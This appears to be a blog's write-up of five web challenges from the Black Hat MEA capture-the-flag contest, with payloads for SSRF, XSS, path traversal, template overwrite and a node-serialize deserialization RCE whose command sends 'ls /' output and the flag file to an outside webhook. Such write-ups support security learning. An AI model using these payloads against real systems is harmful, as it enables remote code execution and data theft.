[{"content":"web challenge - Spatify and here once we open challenge\ni see there is music called learn SQL mmm ok lets explore more as usual check the robots.txt and there is admin page in /superhiddenadminpanel/ endpoint shown in fig here is admin page look like\nbasicly we need a password to log in i tried to inject in admin panel but its useless back to main page of chall trying to add \u0026rsquo; \u0026gt; its need to add 5 chars so tried with \u0026rsquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; and nothing tried with some special chars like * and % and here we go i see % success and give us\ngive us endpoint to /static/audio/secret_password_backup.txt.bak contains admin password back to log in with password and here we got the flag\nflag : BlackHatMEA{957:14:5949fdc31b4bf2f1561b678a8e9fe4fa617dd280}\nweb challenge - peeHpee we got this once we open the challenge\nchecking the source endpoint commented in the source code\n\u0026quot;Check /?source= for the source code --\u0026gt; \u0026quot; by give a look in code .. we have an ( email - test - pass ) parametrs and we have a valied email and password once we trying to log in with creds login failed casue test param missed added test parameter and by pass the $x to escape regex look like this\nand we suceefull login and here is our flag\nflag : BlackHatMEA{957:17:213fbe52ba8275bc20949ce56d069f56f9bc9095}\nWeb challenge - Meme Generator by clicking in VIEW SAUCE we gotta this\nlets explain what hapenning :\u0026gt; @app.route / flag \u0026raquo; mean we should request /flag to print our flag reguser_addr = \u0026quot; 127.0.0.1\u0026quot; \u0026raquo;its mean we need domain refere to local host request.url.startwith l0calhost \u0026raquo; mean we need subdomain start with l0calhost port 8080 \u0026raquo; mean port 8080 lol :\u0026gt; conclude : we need a subdomain start with l0calhost refers to local host with port 8080 and in the end /flag we have 2 ways to got this\nusing localtest.me and pass it our subdomain and port like this http://l0calhost.localtest.me:8080/flag\nor using fbi domain lmao will work too [http://l0calhost.fbi.com:8080/flag FBI OPEN UP you can try ping will work and refere to locaã host lol secound question is .. where should we inject this subdomain ? in fact i dont know wait wait im joking i have two solution lets explain: first one inect as xss with document.location will work after trying i can perform there is XSS and we can use it to complete this mission by passing this payloed to test\u0026quot;\u0026gt;\u0026quot;+document.location=http://l0calhost.fbi.com/flag \u0026amp; OR test\u0026quot;\u0026gt;\u0026quot;+document.locationhttp://l0calhost.fbi.com:8080/flag this way will success and print the flag in same page scound way is : inject using curl \u0026amp; ngrok\ncurl -X POST \u0026ndash;url \u0026ldquo;https://blackhat3-12467700c2749bd40efb1308b4b070f9-0.chals.bh.ctf.sa/api/generate\u0026quot; -F search_engine=88fc-113-173-115-76.ngrok.io?nani= -F query=123\nso : 88fc-113-173-115-76.ngrok.io points to my local server, that will sends a 302 response back to l0calhost.localtest.me:8080/flag and also success with both ways we can get the flag flag : BlackHatMEA{957:22:0907a3bda393a68b4fde6e35b2b599f9d67c3b99}\nweb challenge - Black Note once we open challenge we gotta this\nSign up with random creds , Fuzzing ,cheking source code as usal , when i loged in i can see another page\ntyped any thing and captured request\nyes i noticed notes cookie is base64 lets decode it \u0026gt;\u0026gt;{\u0026quot;notes\u0026quot;:{\u0026quot;0\u0026quot;:Sample Note \u0026quot;,\u0026quot;1\u0026quot;:\u0026quot;hello word\u0026quot;}}\nseems intersting i start play with this notes untill i gotta error\nnode-selalize \u0026raquo; this make us think about deserialization attack , i start searching in google and found article RCE in nodeJS via deserialization attack here is the link of article : https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ cool lets start the exploite here is our payloed :\n{\u0026quot;notes\u0026quot;:{\u0026quot;0\u0026quot;:\u0026quot;_$$ND_FUNC$$_function (){require(\\'child_process\\').exec(\\'curl \u0026lt;your webhook url\u0026gt; -d \\\\\u0026quot;ls=$(ls /)\\\\\u0026quot; /\\', function(error, stdout, stderr) { console.log(stdout) });}()\u0026quot;}} just we eant to pass our webhook url or any interaction server will work https://webhook.site/ After that we should decode payloed again and pass it in notes with webhook url and see if we gotta response or no and yes we got response in webhook\ncool , lets read flag \u0026ldquo;ranDom_fl4gImportant.txt\u0026rdquo;\nedit payloed and replace ls to cat /ranDom_fl4gImportant.txt and return to webhook and yes here is the flag\nflag :BlackHatMEA{981:18:ee542016dc185cd06c6adbdd034c8e19d7780d7d}\nweb challenge - Jimmy’s Blog Hard\nDescription: The technology is always evolving, so why do we still stick with password-based authentication? That makes no sense! That’s why I designed my own password-less login system. I even open-sourced it for everyone interested, how nice of me!\n(@Rpi9) and (@0_Zero_0) solved this challenge together.\nwe were given a website link and the challenge (\u0026quot;Source Code\u0026rdquo;)\nwe went to the website to take a look at what it does and it is a blog for someone named Jimmy\nwith Login, Register and Article Page.\nNvm, we read those articles to know what Jimmy published in his Blog\nits basically an authentication system without needing a password\njust a username and the site automatically generates an encryption key for you to be able to login.\nthat is the main idea \\ next step is to check the site but in a dynamic way try it i mean, so we basically went to register page and created an account with username hecker :/:\nas you see it generated a key with the name we typed with .key ext\nwe tried to make another account with the same username but nope it said username already taken xd\nalso we tried to read this key but wasn\u0026rsquo;t useful, next step is to try the login\nit asks for the username and the access key were given while creating your account.\nafter we logged in just the same article page and Logout button lol?\nwe noticed that there is nothing interesting here, so we moved to the source code\nwe fired node to run the blog locally we started the fight :D\nwe read the basic main files [ run.sh, note.txt, nginx.conf, Dockerfile ]\nnope nothing there, so let\u0026rsquo;s review the juicy javascript code xd\nwe started with index.js it just routing the requests /login, /register..etc\nbut But there was something that caught my attention | those two functions\n1- Show the content of the articles but you should be an admin\n` app.get(\u0026quot;/edit\u0026quot;, (req, res) =\u0026gt; { if (!req.session.admin) return res.sendStatus(401); const id = parseInt(req.query.id).toString(); const article_path = path.join(\u0026quot;articles\u0026quot;, id); try { const article = fs.readFileSync(article_path).toString(); res.render(\u0026quot;edit\u0026quot;, { article: article, session: req.session, flag: process.env.FLAG }); } catch { res.sendStatus(404); } }) ` first one is check if there is a session admin to be able to see the content the edit articles as you see there is flag: process.env.FLAG being render\n2- Edit The Content of the articles\n` app.post(\u0026quot;/edit\u0026quot;, (req, res) =\u0026gt; { if (!req.session.admin) return res.sendStatus(401); try { fs.writeFileSync(path.join(\u0026quot;articles\u0026quot;, req.query.id), req.body.article.replace(/\\r/g, \u0026quot;\u0026quot;)); res.redirect(\u0026quot;/\u0026quot;); } catch { res.sendStatus(404); } }) ` it\u0026rsquo;s an endpoint only admins can access it to edit the articles without filtering the content so that means we can found path traversal vulnerability, so how can we be admins?\u0026hellip; fine let\u0026rsquo;s continue reading the code\nso next file was this edit.ejs of course to see how this file prints the flag | nothing was interested but one thing was\n` \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;%- include('head.ejs') %\u0026gt; \u0026lt;body class=\u0026quot;text-dark bg-light\u0026quot;\u0026gt; \u0026lt;%- include('navbar.ejs') %\u0026gt; \u0026lt;div class=\u0026quot;container my-5 px-5\u0026quot;\u0026gt; \u0026lt;h3 class=\u0026quot;text-center\u0026quot;\u0026gt;Welcome jimmy_jammy, your flag is\u0026lt;/h3\u0026gt; \u0026lt;p class=\u0026quot;mb-5 text-center\u0026quot;\u0026gt;\u0026lt;%= flag %\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;h3\u0026gt;Meanwhile, please feel free to edit your article\u0026lt;/h3\u0026gt; \u0026lt;form method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;textarea class=\u0026quot;form-control mb-3\u0026quot; rows=\u0026quot;15\u0026quot; name=\u0026quot;article\u0026quot;\u0026gt;\u0026lt;%= article %\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button type=\u0026quot;submit\u0026quot; class=\u0026quot;btn btn-dark w-100\u0026quot;\u0026gt;Save Changes\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;%- include('scripts.ejs') %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ` html tag with \u0026lt;h3\u0026gt; Welcome jimmy_jammy\u0026lt;/h3\u0026gt;\nwe realized that this the admin name because the blog named jimmy\u0026rsquo;s blog so this 90% the admin username next step is to find a way to login in as jimmy_jammy.\nso we started see the main authentication files (register.ejs, login.ejs)\nand the common file in all files was (utils.js) so we started with it\nutils.js is contains the main functions of Database inserting users, login check\nthere is username registered jimmy_jammy and admin value is 1\nif you noticed that in register function admin = 0 for normal users\nline 21 it looks like the script is not filtering the value so why we don\u0026rsquo;t give a try for path traversal vulnerability. :::\nso why we don\u0026rsquo;t give it a try to register but using the vulnerability on our side\nlet\u0026rsquo;s get into the first exploit:\nFirst step creating a user with this username to get the key of the admin ( jimmy_jammy ) =\u0026gt; username: ../keys/jimmy_jammy Great, we got the admin\u0026rsquo;s encryption key now we can login as the admin |^:^/\nCool!, since we became admins, so we can view edit page and get our flag!,\nHuh? is that my flag really? nvm we checked all files but we returned back to see if we missed something and yeah we missed the ngnix.conf file\n` server { listen 80 default_server; listen [::]:80 default_server; server_name _; location / { # Replace the flag so nobody steals it! sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day'; sub_filter_once off; proxy_pass http://localhost:3000; } } ` Oops, Flag is being replaced # Replace the flag so nobody steals it!\nsub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';\nso we can\u0026rsquo;t continue locally\nNote: Don\u0026rsquo;t forget we have a path traversal in edit page via id parameter.\nwhile writeFileSyncwhich()allows us to re-write the file content to whatever we want so why we don\u0026rsquo;t get a Nice RCE :D\nvia SSTI (Server Side Template Injection) we can determine the vulnerability by following this endpoint ?id=../views/navbar.ejs\nactually i forgot to take a screenshot of the SSTI but trust me it is vulnerable :DD\nlet\u0026rsquo;s continue after we determined the vuln exists next move is to get RCE\nbut instead of this we will bruteforce the flag and print it in all articles pages\nbecause we solved many challs like this so bruteforce was our first choice.\nby overriding the article file with following script\n` \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;%- include('head.ejs') %\u0026gt; \u0026lt;body class=\u0026quot;text-dark bg-light\u0026quot;\u0026gt; \u0026lt;%- include('navbar.ejs') %\u0026gt; \u0026lt;div class=\u0026quot;container my-5 px-5\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;card mb-4\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;card-header\u0026quot;\u0026gt; \u0026lt;%= article.date %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;card-body\u0026quot;\u0026gt; \u0026lt;h5 class=\u0026quot;card-title\u0026quot;\u0026gt;\u0026lt;%= article.title %\u0026gt;\u0026lt;/h5\u0026gt; \u0026lt;p class=\u0026quot;card-text\u0026quot;\u0026gt; \u0026lt;%= article.summary %\u0026gt; \u0026lt;hr class=\u0026quot;mb-0\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;pre-line\u0026quot;\u0026gt; \u0026lt;%= article.content %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;card-footer text-muted\u0026quot;\u0026gt; \u0026lt;% for (var i =0; i \u0026lt;=59; i++ ) { %\u0026gt; \u0026lt;%= flag[i] %\u0026gt; \u0026lt;% } %\u0026gt; Generated by shriperis \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;%- include('scripts.ejs') %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ` so we intercepted the request while we editing any article and we used the vuln via id param and the endpoint was ?id=../views/navbar.ejs then we encoded our js payload as a url-encoded and we replaced article value to our script\nand we forwarded the request and guess!\nBingo! Thanks For Reading..!\n","permalink":"https://0ozero0.github.io/write-ups/blackhatmea/web-challenges/writeup/","summary":"web challenge - Spatify and here once we open challenge\ni see there is music called learn SQL mmm ok lets explore more as usual check the robots.txt and there is admin page in /superhiddenadminpanel/ endpoint shown in fig here is admin page look like\nbasicly we need a password to log in i tried to inject in admin panel but its useless back to main page of chall trying to add \u0026rsquo; \u0026gt; its need to add 5 chars so tried with \u0026rsquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; and nothing tried with some special chars like * and % and here we go i see % success and give us","title":"black-Hat-MEA-CTF | ALL Web challenges "}]